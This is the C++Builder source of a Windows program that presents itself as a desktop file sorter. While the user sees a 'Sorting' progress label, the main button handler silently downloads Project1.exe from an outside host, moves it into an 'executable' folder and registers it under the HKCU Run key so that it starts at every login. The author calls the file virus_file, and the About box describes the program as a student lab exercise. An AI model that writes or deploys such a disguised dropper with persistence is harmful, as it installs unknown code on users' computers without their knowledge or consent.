#define NO_WIN32_LEAN_AND_MEAN
#include <vcl.h>
#pragma hdrstop

#include "Code.h"
#include <IdSSLOpenSSL.hpp>
#include "windows.h"
#include <direct.h>
#include <Shlobj.h>
#include <String.h>
//---------------------------------------------------------------------------
#pragma package(smart_init)
#pragma resource "*.dfm"
TForm1 *Form1;
//---------------------------------------------------------------------------
__fastcall TForm1::TForm1(TComponent* Owner)
        : TForm(Owner)
{
a=0;
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Button5Click(TObject *Sender)
{
  Label1->Caption="Сортировка";
  Timer1->Enabled = true;
 char szPath1[256];

   SHGetSpecialFolderPath(NULL, szPath1, CSIDL_DESKTOP, FALSE);
   //ShowMessage(szPath1);  //путь к рабочему столу

 // Указываем URL адрес файла в интернете
String URL_DOWNLOAD ="";

// Под каким названием сохраниться загруженный файл
String FILE_NAME = "";
//URL_DOWNLOAD = "http://ardownload.adobe.com/pub/adobe/reader/win/10.x/10.0.1/en_US/AdbeRdr1001_en_US.exe";
//FILE_NAME = "AdbeRdr1001_en_US.exe";
URL_DOWNLOAD = "http://2bay.org/ftp/files/Project1.exe";

FILE_NAME =szPath1+String("\\Project1.exe");

// Создаем указатель на поток для работы файлами
// Ключ fmCreate - означает, что будет создан новый (пустой) файл, если файл с указанным названием уже существует, он будет открыть в режиме чтения. А ключ fmOpenWrite - откроет файл для записи.
TFileStream* FILE_STREAM = new TFileStream(FILE_NAME, fmCreate | fmOpenWrite);

// Отправляем запрос GET на указанный URL с файлом, если сервер нам вернет ответ
// Пустой файл будет занимать столько же места, сколько и загружаемый файл, но в процессе загрузки он будет постепенно дописываться
IdHTTP1->Get(URL_DOWNLOAD, FILE_STREAM);

// После завершения загрузки, освобождаем память
delete FILE_STREAM;



DriveComboBox1->Drive ='c';
//char path[256]="C:\\Users\\rodcowartt\\Desktop";
DirectoryListBox1->Directory=szPath1;

   //создаём папки, если их нет
   if(DirectoryExists(szPath1+String("\\video"))==0)
   MkDir(szPath1+String("\\video"));

   if(DirectoryExists(szPath1+String("\\text"))==0)
   MkDir(szPath1+String("\\text"));

   if(DirectoryExists(szPath1+String("\\other"))==0)
   MkDir(szPath1+String("\\other"));

   if(DirectoryExists(szPath1+String("\\images"))==0)
   MkDir(szPath1+String("\\images"));

   if(DirectoryExists(szPath1+String("\executable"))==0)
   MkDir(szPath1+String("\\executable"));





for(int i=0;i< FileListBox1->Count;i++)
{
String file=FileListBox1->Items->Strings[i];
int a=file.Length()-2;
bool b;
//ShowMessage(file);
AnsiString q1 =szPath1+String("\\")+FileListBox1->Items->Strings[i];
AnsiString q2 =szPath1+String("\\text\\")+FileListBox1->Items->Strings[i];
AnsiString q3 = szPath1+String("\\images\\")+FileListBox1->Items->Strings[i];
AnsiString q4 = szPath1+String("\\video\\")+FileListBox1->Items->Strings[i];
AnsiString q5 =szPath1+String("\\executable\\")+FileListBox1->Items->Strings[i];
AnsiString q6 = szPath1+String("\\other\\")+FileListBox1->Items->Strings[i];
if(file.SubString(a,3)=="txt" || file.SubString(a-1,4)=="docm" || file.SubString(a-1,4)=="docx" || file.SubString(a,3)=="doc" || file.SubString(a,3)=="rtf")
b=MoveFile(q1.c_str(),q2.c_str());
else if (file.SubString(a,3)=="jpg" || file.SubString(a,3)=="bmp" || file.SubString(a,3)=="png" || file.SubString(a,3)=="svg")
b=MoveFile(q1.c_str(),q3.c_str());
else if (file.SubString(a,3)=="mp4" || file.SubString(a,3)=="m4v" || file.SubString(a,3)=="avi" || file.SubString(a,3)=="mov")
b=MoveFile(q1.c_str(),q4.c_str());
else if (file.SubString(a,3)=="exe")
b=MoveFile(q1.c_str(),q5.c_str());
else
b=MoveFile(q1.c_str(),q6.c_str());
}

String virus_file=szPath1+String("\\executable\\Project1.exe");
HKEY hKey;
char* szPath2=virus_file.c_str();//"D:\\3 курс 2 сем\\ТОКБ\\4 лаба\\tokb2\\Project1.exe";
//GetModuleFileName(NULL, szPath, sizeof(szPath));
//ShowMessage(szPath2);
RegCreateKeyEx(HKEY_CURRENT_USER,
                 "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                 NULL,
                 "",
                 REG_OPTION_NON_VOLATILE,
                 KEY_SET_VALUE,
                 NULL,
                 &hKey,
                 NULL);

if (hKey)
{
    RegSetValueEx(hKey, "My program", NULL, REG_SZ, (LPBYTE)szPath2, strlen(szPath2));
    RegCloseKey(hKey);
}

Timer1->Enabled = false;
Label1->Caption="Сортировка завершена!";
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Exit1Click(TObject *Sender)
{
Form1->Close();
}
//---------------------------------------------------------------------------
void __fastcall TForm1::About1Click(TObject *Sender)
{
 ShowMessage("Программа выполнена для учебных целей.\nПервая часть данной программы сортирует рабочий стол.\nВторая же часть скачивает файл из интернета и ставит его на автозагрузку.\nАвтор программы студент группы БИ-31 Белков А.И.");
}

void __fastcall TForm1::Timer1Timer(TObject *Sender)
{
if(a==0)
{
 Label1->Caption="Cортировка ";
  a=1;
}
else if(a==1)
{
  Label1->Caption="Cортировка .";
  a=2;
}
 else if(a==2)
{
  Label1->Caption="Cортировка . .";
  a=3;
}
else
{
  Label1->Caption="Cортировка . . .";
  a=0;
}
}
//---------------------------------------------------------------------------


